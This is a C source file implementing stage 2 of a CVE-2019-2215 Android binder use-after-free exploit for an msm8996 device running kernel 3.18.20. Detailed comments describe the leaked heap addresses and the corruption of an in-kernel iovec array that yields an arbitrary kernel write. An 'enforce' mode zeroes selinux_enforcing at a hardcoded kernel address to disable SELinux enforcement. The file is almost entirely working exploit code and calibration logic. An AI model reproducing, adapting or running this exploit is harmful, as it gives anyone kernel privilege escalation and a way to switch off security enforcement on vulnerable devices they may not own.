#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <sched.h>

/* CVE-2019-2215 STAGE 2 for Xplay6 / msm8996 3.18.20 -- destination redirect.
 *
 * Why this file exists: stage 1 (tools/broot.c) is proven on this device, and four
 * earlier stage-2 attempts (broot2..5) were measured with canaries placed in OUR OWN
 * pages.  That observation channel could not see the mechanism, because the first
 * write the kernel performs goes to the address the *wait head* is re-linked to, and
 * the leak now proves what that address is:
 *
 *   art/broot.leak, window starting at slot+0x50 (captured 2026-10-13 07:05):
 *     slot+0x50 (wait.head.next, == iov[5].iov_base) = 0xffffffc0a3617c50
 *     slot+0x58 (wait.head.prev, == iov[5].iov_len)  = 0xffffffc0a3617c50
 *     slot+0x68 (iov[6].iov_len, untouched)          = 0x00010001
 *   0xffffffc0a3617c50 - 0x50 = 0xffffffc0a3617c00 is 512-byte aligned => that is the
 *   recycled kmalloc-512 slot itself, i.e. epoll_ctl(DEL)'s list_del() left
 *   head.next = head.prev = &head.  So iov[5].iov_base becomes a POINTER TO OUR OWN
 *   IN-KERNEL COPY OF THE IOVEC ARRAY, and a stream write that reaches segment 5 is
 *   copied *into the descriptor array we are walking with*.
 *
 * That single fact is the whole primitive:
 *   memcpy_to_iter() re-reads iov->iov_base / iov->iov_len from that array for every
 *   segment, so a chunk of our choosing can rewrite the descriptors of the segments
 *   that have not been consumed yet -- and the bytes that follow the chunk then get
 *   copied to whatever address we just installed.  Kernel writes to a user page are
 *   fine on this build (no PAN), so the first target is deliberately a user page.
 *
 * Geometry of our own array inside the slot (measured, ledger S6/S53):
 *   sizeof(binder_thread)=0x128 -> kmalloc-512; 25*sizeof(iovec)=400 -> kmalloc-512
 *   thread->wait = slot+0x48 : lock(u32) pad, head.next @0x50, head.prev @0x58
 *   => slot+0x48 = iov[4].iov_len      (the ticket spinlock: 0 when unlocked,
 *                                       0x00010001 after one lock/unlock cycle)
 *   => slot+0x50 = iov[5].iov_base     (head.next)
 *   => slot+0x58 = iov[5].iov_len      (head.prev)
 *
 * Sequence (deterministic, no spray race): the SAME thread that frees the binder_thread
 * then calls recvmsg(), so its kmalloc(400) takes the slot it just freed -- the same
 * reason stage 1 works reliably.  A pending synchronous transaction is armed first
 * because binder_poll() only registers the epoll wait entry on &thread->wait when
 * todo is empty AND transaction_stack is non-NULL AND return_error == BR_OK.
 *
 * MODES
 *   selftest : install descriptors pointing at our own canary page and verify the 8
 *              payload bytes land there.  Writes NOTHING in the kernel.  This is the
 *              gate that proves the redirect; only then is aiming at kernel .data safe.
 *   enforce  : same, but the installed destination is selinux_enforcing (static, and
 *              readable by shell via /sys/fs/selinux/enforce) with a 4-byte zero payload
 *              => getenforce must become Permissive.
 */
#define IOVEC_ARRAY_SZ   25
#define SLOT_LOCK        0x48
#define SLOT_HEAD        0x50
#define IDX_LOCK         (SLOT_LOCK / 16)          /* 4 : its iov_len *IS* the lock */
#define IDX_HEAD         (SLOT_HEAD / 16)          /* 5 : base/len *IS* head.next/prev */
#define TICKET_MUTATED   0x00010001UL              /* what the lock becomes after DEL */
#define BINDER_THREAD_EXIT 0x40046208u
#define SELINUX_ENFORCING  0xffffffc00189be74UL

#define BLK 0x2000

typedef uint64_t binder_size_t;
typedef uint64_t binder_uintptr_t;
struct binder_transaction_data {
    union { uint32_t handle; binder_uintptr_t ptr; } target;
    binder_uintptr_t cookie;
    uint32_t code, flags;
    int32_t sender_pid;
    uint32_t sender_euid;
    binder_size_t data_size, offsets_size;
    union { struct { binder_uintptr_t buffer, offsets; } ptr; uint8_t buf[8]; } data;
};
/* field order is the uapi order -- write_buffer sits BETWEEN write_consumed and
 * read_size; interleaving the sizes (as an earlier draft of this file did) makes the
 * kernel take read_size as the write pointer and fail with EFAULT. */
struct binder_write_read {
    binder_size_t write_size;
    binder_size_t write_consumed;
    binder_uintptr_t write_buffer;
    binder_size_t read_size;
    binder_size_t read_consumed;
    binder_uintptr_t read_buffer;
};
#define BINDER_WRITE_READ _IOWR('b', 1, struct binder_write_read)
#define BC_TRANSACTION    _IOW('c', 0, struct binder_transaction_data)

static void pin0(void)
{
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(0, &s);
    sched_setaffinity(0, sizeof s, &s);
}

/* Arm a synchronous transaction to the context manager, then consume the queued
 * BR_TRANSACTION_COMPLETE without eating a BR_REPLY -- the only state where
 * binder_poll() calls poll_wait() on &thread->wait (the queue BINDER_THREAD_EXIT frees). */
static int arm_pending_tx(int fd)
{
    char wbuf[4 + sizeof(struct binder_transaction_data)];
    char payload[16];
    struct binder_transaction_data tr;
    struct binder_write_read bwr;
    uint32_t cmd = BC_TRANSACTION;
    int rc, a;

    memset(payload, 0, sizeof payload);
    memset(&tr, 0, sizeof tr);
    tr.target.handle = 0;
    tr.code = 2;                    /* check_service */
    tr.data_size = sizeof payload;
    tr.data.ptr.buffer = (binder_uintptr_t)(uintptr_t)payload;
    memcpy(wbuf, &cmd, 4);
    memcpy(wbuf + 4, &tr, sizeof tr);
    memset(&bwr, 0, sizeof bwr);
    bwr.write_size = sizeof wbuf;
    bwr.write_buffer = (binder_uintptr_t)(uintptr_t)wbuf;
    errno = 0;
    rc = ioctl(fd, BINDER_WRITE_READ, &bwr);
    printf("  arm tx rc=%d errno=%d wconsumed=%llu\n", rc, errno,
           (unsigned long long)bwr.write_consumed);
    if (rc)
        return rc;
    for (a = 0; a < 3; a++) {
        char rbuf[256];
        struct binder_write_read b2;
        size_t off;
        int done = 0, reply = 0;

        memset(rbuf, 0, sizeof rbuf);
        memset(&b2, 0, sizeof b2);
        b2.read_size = sizeof rbuf;
        b2.read_buffer = (binder_uintptr_t)(uintptr_t)rbuf;
        errno = 0;
        rc = ioctl(fd, BINDER_WRITE_READ, &b2);
        off = 0;
        while (off + 4 <= (size_t)b2.read_consumed) {
            uint32_t c;
            memcpy(&c, rbuf + off, 4);
            off += 4;
            if (c == 0x7206)
                done = 1;
            else if (c == 0x80407203 || c == 0x80407202) {
                reply = 1;
                off += 64;
            }
        }
        printf("  drain %d rc=%d errno=%d rconsumed=%llu complete=%d reply=%d\n",
               a, rc, errno, (unsigned long long)b2.read_consumed, done, reply);
        if (rc)
            return rc;
        if (done && !reply)
            return 0;
        if (reply)
            return -1;
    }
    return -1;
}

int main(int argc, char **argv)
{
    const char *mode = argc > 1 ? argv[1] : "selftest";
    int do_enforce = !strcmp(mode, "enforce");
    /* Calibration knobs (selftest only): the destination offset inside our own canary page
     * and the length we install.  Both are measured rather than trusted: the first hit
     * landed 4096 bytes at canary+0 although canary+64/len=4 had been installed, and a
     * full-page blind write into kernel .data is not acceptable. */
    long cal_base = argc > 3 ? strtol(argv[3], NULL, 0) : 64;
    long cal_len  = argc > 4 ? strtol(argv[4], NULL, 0) : 4;
    struct iovec iov[IOVEC_ARRAY_SZ];
    struct epoll_event ev = { .events = EPOLLIN };
    unsigned long *dump, *canary, *filler;
    unsigned char *pg[12];            /* one distinct page per candidate segment */
    unsigned long chunk[16];
    int socks[2], fd, epfd, i, rc = 1;
    int rounds = argc > 2 ? atoi(argv[2]) : 1, r;

    setvbuf(stdout, NULL, _IONBF, 0);
    pin0();

    /* dump receives the chunk (it lands in the array, so this is only a label);
     * canary is the page the redirect is aimed at in selftest mode; filler absorbs the
     * 0x10001 bytes the mutated spinlock field demands. */
    dump = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    canary = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    /* MUST be >= the 0x10001 bytes the poisoned lock segment demands: at 32 KiB the
     * filler copy overran this mapping into the neighbouring canary page, which is what
     * made the previous run look like a successful redirect (it was our own overflow). */
    filler = mmap(NULL, 0x200000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (dump == MAP_FAILED || canary == MAP_FAILED || filler == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    memset(dump, 0xAA, 0x4000);
    for (i = 0; i < 512; i++)
        canary[i] = 0x1122334455667788UL + i;
    for (i = 0; i < 12; i++) {
        pg[i] = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        memset(pg[i], 0xB0 + i, 0x4000);
    }

    epfd = epoll_create(8);
    for (r = 0; r < rounds; r++) {
        int rcanary_before = (int)canary[0];
        unsigned char prim[8];

        fd = open("/dev/binder", O_RDWR | O_NONBLOCK);
        if (fd < 0) { perror("open binder"); return 1; }
        /* binder_mmap() refuses writable mappings on this build; the parcel is read from
         * ordinary user memory, so we only need proc->alloc to exist. */
        if (mmap(NULL, 1 << 20, PROT_READ, MAP_SHARED, fd, 0) == MAP_FAILED) {
            perror("mmap binder");
            close(fd);
            return 1;
        }
        if (arm_pending_tx(fd)) { printf("  arm failed round %d\n", r); close(fd); continue; }
        if (epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev)) { perror("epoll add"); close(fd); return 1; }


        memset(iov, 0, sizeof iov);
        memset(filler, 0x5A, 0x200000);
        /* every pre-DEL length is chosen so that, walking the array, data stops exactly
         * where we want it: [IDX_LOCK] must start at 0 (unlocked ticket); the DEL makes it
         * 0x00010001, which then demands that many filler bytes before segment IDX_HEAD. */
        /* every segment before [5] must demand ZERO bytes: with an 8-byte primer here the
         * lock segment then ate 8 bytes of the filler and the chunk started misaligned
         * (measured: recvmsg returned 65545 = 8+0x10001, i.e. 1 byte of the chunk was
         * consumed by [4] and the remaining 127 landed shifted inside [5]). */
        iov[0].iov_base = filler;              iov[0].iov_len = 0;
        iov[IDX_LOCK].iov_base = filler;       iov[IDX_LOCK].iov_len = 0;      /* the lock */
        /* Budget must exceed everything that will be streamed through this segment
         * (filler 0x10001 + chunk + payload); the earlier run used 0x4000 and
         * recvmsg returned exactly 8 + 0x4000, i.e. the segment was satisfied and the
         * call ended BEFORE the chunk was ever copied -- the poisoning was not absent,
         * the iterator budget was too small. */
        iov[IDX_HEAD].iov_base = filler;       iov[IDX_HEAD].iov_len = 0x20000;
        for (i = 0; i < IOVEC_ARRAY_SZ; i++)
            if (!iov[i].iov_base)
                iov[i].iov_base = filler;

        /* The chunk is copied into the array at slot+0x50, i.e. starting at
         * iov[IDX_HEAD].iov_base.  Layout:
         *   +0x00 -> iov[5].base : park the rest of this segment in a user buffer
         *   +0x08 -> iov[5].len  : 0 => the walker advances immediately to iov[6]
         *   +0x10 -> iov[6].base : OUR CHOSEN DESTINATION (the redirect)
         *   +0x18 -> iov[6].len  : bytes of payload to write there
         * The payload words that follow are written by the same stream, so the value is
         * delivered by this very write, right after the descriptors it uses. */
        memset(chunk, 0, sizeof chunk);
        chunk[0] = (unsigned long)pg[5];                      /* iov[5].base  marker 0xB5 */
        /* MUST equal the number of bytes that actually land in [5] during this skb
         * (the chunk itself).  With 0x1000 the walker could never satisfy
         * skip == iov_len, so it never advanced to [6] -- that is why the previous
         * run showed "no page changed" WITHOUT refuting the redirect. */
        chunk[1] = 128;                                       /* iov[5].len := this skb */
        /* calibration: destination INSIDE our own page at +64, tiny declared length.
         * What actually changes tells us the real per-skb copy size semantics before any
         * kernel address is aimed at (an overshoot here is harmless, in .data it is not). */
        chunk[2] = do_enforce ? (unsigned long)SELINUX_ENFORCING : (unsigned long)pg[6];
        chunk[3] = do_enforce ? 4 : 0x40;                     /* iov[6].len   => 64 bytes land in pg[6] */
        chunk[4] = (unsigned long)pg[7];                      /* iov[7].base */
        chunk[5] = 0x80;                                      /* iov[7].len  */
        chunk[6] = (unsigned long)pg[8]; chunk[7] = 0xC0;     /* iov[8] */
        chunk[10] = (unsigned long)pg[9]; chunk[11] = 0x100;  /* iov[9] (chunk+0x50/0x58) */
        /* payload to be delivered at the installed destination:
         * selftest => a distinctive 8-byte tag into our canary page
         * enforce  => four zero bytes into selinux_enforcing */
        chunk[8] = 0x4C45414B5245444FULL;                    /* selftest payload tag @chunk+64 */
        chunk[9] = 0;                                        /* enforce payload = 4 zero bytes */

        if (socketpair(AF_UNIX, SOCK_STREAM, 0, socks)) { perror("socketpair"); close(fd); return 1; }

        rc = fork();
        if (rc < 0) { perror("fork"); return 1; }
        if (rc == 0) {
            prctl(PR_SET_PDEATHSIG, SIGKILL);
            close(socks[0]);
            sleep(1);
            printf("CHILD: DEL\n"); fflush(stdout);
            if (epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &ev))
                perror("child epoll del");
            printf("CHILD: DEL done, feeding 8\n"); fflush(stdout);
            /* no primer at all: the filler below must total exactly 0x10001 so that the
             * lock segment ends flush with the end of the data and the chunk starts [5] */
            (void)prim;
            printf("CHILD: feeding 0x10001 filler\n"); fflush(stdout);
            /* the mutated lock field at slot+0x48 is now iov[IDX_LOCK].iov_len = 0x10001,
             * so this many bytes are absorbed before the walker reaches segment IDX_HEAD */
            {
                size_t left = TICKET_MUTATED, got;
                unsigned char *bp = (unsigned char *)filler;
                while (left) {
                    got = left > 0x8000 ? 0x8000 : left;
                    if (write(socks[1], bp, got) != (ssize_t)got) { perror("child filler"); break; }
                    left -= got;
                }
            }
            printf("CHILD: feeding chunk (%zu)\n", sizeof chunk); fflush(stdout);
            if (write(socks[1], chunk, sizeof chunk) != (ssize_t)sizeof chunk)
                perror("child chunk");
            /* Each write to a AF_UNIX stream socket is its own skb, so this is the copy
             * call boundary we need: the chunk's memcpy ends, and memcpy_to_iter then
             * re-reads the lengths the chunk itself rewrote (skip == new [5].len => the
             * walker advances to [6], whose base/len we installed) before this payload. */
            {
                unsigned long tg = 0x4C45414B5245444FULL;
                if (write(socks[1], &tg, 8) != 8)
                    perror("child payload");
            }
            /* The descriptors above are consumed by the same skb that carried them: a single
             * memcpy_to_iter() copies the whole chunk into the array, and only THEN does
             * iov_iter_advance() walk the new descriptors.  So the value has to arrive in a
             * LATER write, which is what lands at the destination we just installed.
             * iov[5].iov_len was set to sizeof(chunk) exactly so that the advance consumes
             * precisely the chunk and stops at offset 0 of iov[6] -- otherwise the payload
             * would be written at dest + leftover. */
            {
                size_t pl = do_enforce ? 4 : 8;
                unsigned char *pv = (unsigned char *)chunk + 64;   /* our payload words */
                if (write(socks[1], pv, pl) != (ssize_t)pl)
                    perror("child payload");
            }
            close(socks[1]);
            close(socks[0]);
            _exit(0);
        }
        close(socks[1]);

        /* The free must be IMMEDIATELY before the array allocation: socketpair()/fork in
         * between perform their own kmalloc-512 allocations and would take the freed slot
         * instead of our iovec array (that is what the first two selftest runs measured:
         * segment IDX_LOCK still 0, i.e. our array never became the wait queue).  This is
         * also poc98's order: socketpair -> fork -> child DEL -> parent EXIT -> recvmsg. */
        /* Without this the thread is never freed, the wait entry stays on a LIVE
         * thread->wait, the DEL below is a legitimate list_del, and our array lands in a
         * different slot -- i.e. there is no UAF at all (this is exactly what the first
         * selftest run measured: segment IDX_LOCK still 0, no poisoning).  The exit must
         * come after epoll ADD (so the entry is registered) and before the recvmsg below
         * (so our kmalloc(400) is what recycles the freed kmalloc-512 object). */
        errno = 0;
        if (ioctl(fd, BINDER_THREAD_EXIT, NULL)) {
            perror("BINDER_THREAD_EXIT");
            close(fd);
            return 1;
        }

        errno = 0;
        rc = recvmsg(socks[0], &(struct msghdr){ .msg_iov = iov, .msg_iovlen = IOVEC_ARRAY_SZ },
                     MSG_WAITALL);
        printf("  recvmsg -> %d errno=%d\n", rc, errno);
        close(socks[0]);
        {
            int st = 0;
            wait_for_child:
            if (waitpid(rc, &st, 0) < 0 && errno == EINTR)
                goto wait_for_child;
        }
        close(fd);

        {
            int t;
            printf("  === mapping: which target page got written, and how much ===\n");
            for (t = 0; t < 12; t++) {
                int c = 0, f = -1, l = -1, k;
                unsigned char want = (unsigned char)(0xB0 + t);
                for (k = 0; k < 0x4000; k++)
                    if (pg[t][k] != want) { if (f < 0) f = k; l = k; c++; }
                if (c)
                    printf("    pg[%d] (+0x%x bytes at %d distinct) first=+0x%x last=+0x%x  val=%02x\n",
                           t, c, c, f, l, pg[t][f]);
            }
        }
        printf("  canary[0] before=%08x after=%016lx  canary[1]=%016lx\n",
               rcanary_before, canary[0], canary[1]);
        if (canary[0] == 0x4C45414B5245444FULL) {
            printf("  *** REDIRECT PROVEN: our payload was written through a descriptor we installed ***\n");
            rc = 0;
        } else {
            unsigned long *p = canary;
            int j, changed = 0, first = -1, last = -1;
            for (j = 0; j < 512; j++)
                if (p[j] != 0x1122334455667788UL + j) {
                    if (first < 0)
                        first = j;
                    last = j;
                    changed++;
                }
            if (changed)
                printf("  changed range: word %d (+0x%x) .. word %d (+0x%x) => %d bytes\n",
                       first, first * 8, last, last * 8, (last - first + 1) * 8);
            printf("  canary words modified: %d\n", changed);
            if (changed) {
                for (j = 0; j < 512 && changed; j++)
                    if (p[j] != 0x1122334455667788UL + j) {
                        printf("   first change at +%d = %016lx\n", j * 8, p[j]);
                        changed = 0;
                    }
            }
        }
        if (do_enforce) {
            printf("  getenforce: ");
            fflush(stdout);
            system("getenforce; cat /sys/fs/selinux/enforce 2>&1");
        }
        if (rc == 0)
            break;
    }
    return rc == 0 ? 0 : 4;
}
